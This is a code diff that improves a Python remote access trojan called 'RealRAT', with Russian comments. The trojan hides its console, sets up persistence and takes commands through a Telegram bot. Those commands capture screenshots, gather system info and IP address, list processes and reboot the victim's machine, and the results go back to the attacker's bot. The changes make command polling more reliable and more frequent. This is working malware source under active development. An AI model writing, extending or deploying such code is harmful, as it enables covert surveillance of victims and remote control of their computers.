@@ -5,6 +5,7 @@ import subprocess
 import time
 import shutil
 import socket
+import sys
 
 try:
     from PIL import ImageGrab
@@ -24,6 +25,7 @@ class RealRAT:
         self.bot_token = BOT_TOKEN
         self.chat_id = CHAT_ID
         self.victim_id = socket.gethostname()
+        self.last_update_id = 0  # Запоминаем последнее обработанное сообщение
         
     def hide_console(self):
         try:
@@ -80,8 +82,7 @@ class RealRAT:
                 'keyboard': [
                     [{'text': '📸 Скриншот'}, {'text': '💻 Информация'}],
                     [{'text': '🌐 IP адрес'}, {'text': '📊 Процессы'}],
-                    [{'text': '🔄 Перезагрузить'}, {'text': '🚪 Выйти'}],
-                    [{'text': '🗑️ Удалить RAT'}]
+                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}]
                 ],
                 'resize_keyboard': True
             }
@@ -90,7 +91,11 @@ class RealRAT:
                 'text': f'🎯 Управление жертвой: {self.victim_id}\nВыберите действие:',
                 'reply_markup': keyboard
             }
-            requests.get(url, params=params, timeout=10)
+            response = requests.get(url, params=params, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                if 'result' in data:
+                    self.last_update_id = data['result']['update_id']  # Запоминаем ID клавиатуры
         except:
             pass
 
@@ -127,7 +132,7 @@ class RealRAT:
                 result = subprocess.check_output('tasklist', shell=True, stderr=subprocess.STDOUT)
             else:
                 result = subprocess.check_output('ps aux', shell=True, stderr=subprocess.STDOUT)
-            return result.decode('utf-8', errors='ignore').strip()[:3000]  # Обрезаем чтобы влезло в Telegram
+            return result.decode('utf-8', errors='ignore').strip()[:3000]
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
 
@@ -168,9 +173,6 @@ class RealRAT:
                     os.system('shutdown -r +1')
                     return "🔄 Перезагрузка через 1 минуту!"
                     
-            elif command == '🚪 Выйти':
-                return "❌ RAT продолжает работать в фоне. Используйте 'Удалить RAT' для полного удаления."
-                
             elif command == '🗑️ Удалить RAT':
                 if self.uninstall_rat():
                     return "🗑️ RAT удалена из автозагрузки! Завершение работы..."
@@ -184,21 +186,29 @@ class RealRAT:
             return f"❌ Ошибка: {str(e)}"
 
     def check_commands(self):
-        """Проверяем команды от бота"""
+        """Проверяем только НОВЫЕ команды от бота"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
-            response = requests.get(url, timeout=10)
+            params = {'offset': self.last_update_id + 1}  # Только сообщения после последнего обработанного
+            response = requests.get(url, params=params, timeout=10)
             
             if response.status_code == 200:
                 data = response.json()
                 if 'result' in data:
                     for update in data['result']:
+                        update_id = update['update_id']
+                        
+                        # Обновляем ID последнего сообщения
+                        if update_id > self.last_update_id:
+                            self.last_update_id = update_id
+                        
+                        # Обрабатываем только если есть сообщение с текстом
                         if 'message' in update and 'text' in update['message']:
                             message_text = update['message']['text']
                             
                             # Обрабатываем команды с кнопок
                             if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
-                                              '🔄 Перезагрузить', '🚪 Выйти', '🗑️ Удалить RAT']:
+                                              '🔄 Перезагрузить', '🗑️ Удалить RAT']:
                                 result = self.execute_command(message_text)
                                 self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                 
@@ -206,7 +216,7 @@ class RealRAT:
                                 if message_text == '🗑️ Удалить RAT':
                                     time.sleep(2)
                                     sys.exit(0)
-                                
+                            
         except:
             pass
 
@@ -214,21 +224,29 @@ class RealRAT:
         self.hide_console()
         self.setup_persistence()
         
+        # Получаем текущие обновления чтобы игнорировать старые сообщения
+        try:
+            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                if 'result' in data and data['result']:
+                    # Устанавливаем последнее ID чтобы игнорировать старые сообщения
+                    self.last_update_id = data['result'][-1]['update_id']
+        except:
+            pass
+        
         # Отправляем уведомление и клавиатуру
         time.sleep(10)
         system_info = self.collect_system_info()
         self.send_to_telegram(system_info)
         self.send_keyboard()
         
-        # Первый скриншот
-        time.sleep(5)
-        self.take_screenshot()
-        
-        # Основной цикл
+        # Основной цикл - проверяем только новые команды
         while True:
             try:
                 self.check_commands()
-                time.sleep(5)
+                time.sleep(3)  # Проверяем чаще
             except:
                 time.sleep(10)
                 continue
